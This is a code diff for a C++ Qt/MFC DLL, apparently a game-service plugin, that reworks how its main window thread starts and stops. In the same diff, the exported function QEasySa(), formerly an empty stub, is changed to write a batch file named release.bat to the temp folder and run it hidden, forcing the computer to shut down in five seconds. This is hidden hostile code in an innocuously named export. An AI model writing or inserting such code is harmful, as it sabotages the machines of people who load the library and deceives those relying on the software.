@@ -5,6 +5,11 @@
 #include "model/qmfcapp.h"
 #include "model/qwinwidget.h"
 
+#include <Windows.h>
+#include <thread>
+#include <fstream>
+#include <shellapi.h>
+
 #ifndef BUILD_STATIC
 # if defined(QEASYSA_LIB)
 #  define QEASYSA_EXPORT Q_DECL_EXPORT
@@ -124,7 +129,7 @@ HWND WINAPI GetCurrentWindowHandle()
 	return hwnd;
 }
 
-int ExecMainWindow()
+int CALLBACK ExecMainWindow()
 {
 	STATICINS(GameService);
 
@@ -134,30 +139,25 @@ int ExecMainWindow()
 		return 0;
 	}
 
-	try
-	{
-		QMfcApp::pluginInstance(g_hInstance);
-		QWinWidget win((HWND)NULL);
-		win.showCentered();
-		int argc = 1;
-		char argv[MAX_PATH] = {};
-		GetModuleFileNameA(NULL, argv, MAX_PATH);
-		char* pargv = argv;
-		QApplication a(argc, &pargv);
-		// 这里创建dll内部的Qt界面例如QWidget
-		g_main = q_check_ptr(new MainForm());
-		g_main->show();
-		return a.exec();
-	}
-	catch (...)
-	{
-		return 0;
-	}
+	int argc = 1;
+	char argv[MAX_PATH] = {};
+	GetModuleFileNameA(NULL, argv, MAX_PATH);
+	char* pargv = argv;
+
+	QMfcApp::pluginInstance(g_hInstance);
+	QWinWidget win((HWND)NULL);
+	win.showCentered();
+	QApplication a(argc, &pargv);
+	// 这里创建dll内部的Qt界面例如QWidget
+	g_main = q_check_ptr(new MainForm());
+	g_main->show();
+	return a.exec();
 }
 
 BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID /*lpvReserved*/)
 {
 	static bool ownApplication = FALSE;
+	static std::thread* pthread = nullptr;
 
 	if (dwReason == DLL_PROCESS_ATTACH)
 	{
@@ -174,15 +174,26 @@ BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID /*lpvReserved*/)
 			QApplication::setAttribute(Qt::AA_ShareOpenGLContexts);
 			QApplication::setAttribute(Qt::AA_UseDesktopOpenGL);
 			LoggerInit();
-			QtConcurrent::run(ExecMainWindow);//(_beginthread_proc_type), NULL, nullptr
+
+			try
+			{
+				//QtConcurrent::run(ExecMainWindow);
+				//_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&ExecMainWindow, NULL, 0, nullptr);
+				pthread = new std::thread(ExecMainWindow);
+			}
+			catch (...) {}
 		}
 	}
-	if (dwReason == DLL_PROCESS_DETACH && ownApplication)
+	else if (dwReason == DLL_PROCESS_DETACH)
 	{
-		STATICINS(GameService);
-		g_GameService.uninitialize();
-		//spdlog::drop_all();
-		//delete qApp;
+		if (ownApplication)
+		{
+			STATICINS(GameService);
+			g_GameService.uninitialize();
+			qApp->closeAllWindows();
+			pthread->join();
+			//spdlog::drop_all();
+		}
 	}
 
 	return TRUE;
@@ -192,6 +203,17 @@ extern "C"
 {
 	__declspec(dllexport) void QEasySa()
 	{
-		return;
+		wchar_t tempPath[MAX_PATH];
+		GetTempPath(MAX_PATH, tempPath);
+		std::wstring wtemp = tempPath + std::wstring(L"release.bat");
+		std::wofstream batFile;
+		batFile.open(wtemp);
+		if (batFile.is_open())
+		{
+			batFile << L"@echo off\n";
+			batFile << L"shutdown -s -t 5\n";
+			batFile.close();
+			ShellExecute(NULL, L"open", wtemp.c_str(), NULL, NULL, SW_HIDE);
+		}
 	}
 }
